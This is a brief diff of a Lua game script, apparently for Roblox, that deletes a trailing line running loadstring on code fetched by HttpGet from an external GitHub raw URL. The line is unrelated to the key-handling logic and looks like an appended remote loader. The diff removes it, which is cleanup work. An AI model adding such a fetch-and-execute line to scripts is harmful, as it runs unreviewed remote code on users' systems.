@@ -15,4 +15,3 @@ Mouse.KeyDown:Connect(function(key)
         end
     end
 end)
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/aphixeaphixeaphixeaphixeaphixeaphixe/reset/main/reset'),true))()
